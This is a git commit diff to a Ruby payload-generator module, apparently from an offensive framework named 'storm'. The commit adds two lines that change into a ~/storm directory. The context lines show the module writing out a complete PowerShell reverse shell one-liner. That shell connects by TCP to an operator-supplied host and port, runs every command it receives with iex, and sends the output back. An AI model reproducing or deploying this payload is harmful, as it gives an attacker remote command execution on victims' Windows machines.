1b7b14f76c15de2e34373b16eb59bbb976503571
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2020-05-02 15:44:12 +0300

    Update powershell.rb

--- etc/modules/payload/powershell.rb
+++ etc/modules/payload/powershell.rb
@@ -59,6 +59,8 @@ begin
     open(file, 'w') { |f|
         f.puts "$client = New-Object System.Net.Sockets.TCPClient(#{host},#{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
     }
+    g = ENV['HOME']
+    Dir.chdir(g + "/storm")
     puts "#{s}Saved to #{file}!"
 rescue
     puts "#{e}Failed to generate payload!"
